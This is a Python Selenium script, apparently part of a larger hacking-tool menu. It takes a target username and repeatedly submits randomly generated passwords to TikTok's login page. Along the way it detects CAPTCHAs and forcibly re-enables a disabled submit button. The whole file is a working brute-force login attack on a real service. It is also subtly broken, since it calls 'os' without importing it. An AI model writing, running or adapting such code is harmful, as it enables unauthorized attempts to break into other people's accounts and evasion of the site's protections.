import random
import string
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException

valid_characters = list(string.ascii_letters)
valid_characters += list(string.digits)
valid_characters += ['!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '_', '-', '+', '=', '{', '}', '[', ']', ':', ';', ',', '.', '<', '>', '?', '/']

def generate_passwords(num_passwords, length=8):
    passwords = []
    for _ in range(num_passwords):
        password = ''.join(random.choice(valid_characters) for _ in range(length))
        passwords.append(password)
    return passwords

def init_driver(browser):
    if browser == "chrome":
        driver = webdriver.Chrome()
    elif browser == "firefox":
        driver = webdriver.Firefox()
    elif browser == "edge":
        driver = webdriver.Edge()
    else:
        raise ValueError("Browser not supported. Choose from 'chrome', 'firefox', 'edge'")
    return driver

def detect_captcha(driver):
    try:
        captcha_frame = driver.find_element(By.XPATH, "//iframe[contains(@src, 'captcha')]")
        return True
    except NoSuchElementException:
        return False

def try_login(browser, num_attempts=10):
    driver = init_driver(browser)
    passwords = generate_passwords(num_attempts)

    for password in passwords:
        driver.get("https://www.tiktok.com/login/phone-or-email/email")
        time.sleep(2)

        try:
            username_field = driver.find_element(By.XPATH, "//input[@name='username']")
            password_field = driver.find_element(By.XPATH, "//input[@type='password']")

            username_field.clear()
            password_field.clear()

            username_field.send_keys(username)  
            password_field.send_keys(password)

            # Detect CAPTCHA
            if detect_captcha(driver):
                print("CAPTCHA detected! Please solve it.")
                start_time = time.time()

                while True:
                    if time.time() - start_time > 3:  
                        print("CAPTCHA not solved in time, reloading page...")
                        driver.refresh()
                        break

                    if not detect_captcha(driver):
                        print("CAPTCHA solved!")
                        break

                    time.sleep(1) 

            submit_button = driver.find_element(By.XPATH, "//button[@type='submit']")
            driver.execute_script("arguments[0].removeAttribute('disabled');", submit_button)

            submit_button.click()

            time.sleep(2)  
        except Exception as e:
            print(f"Connection attempt error: {e}")

    print("Process completed. Keeping browser open indefinitely.")
    try:
        while True:
            time.sleep(1)  
    except KeyboardInterrupt:
        print("Process interrupted manually.")
    
    driver.quit()

if __name__ == "__main__":
    username = input("Enter the USERNAME: ")
    browser_choice = input("Choose your navigator (chrome, firefox, edge): ").lower()
    try_login(browser_choice, num_attempts=5)
    input("[x] Appuyer sur entrée pour retourner au menu principal.")
    os.system('python ../../main.py')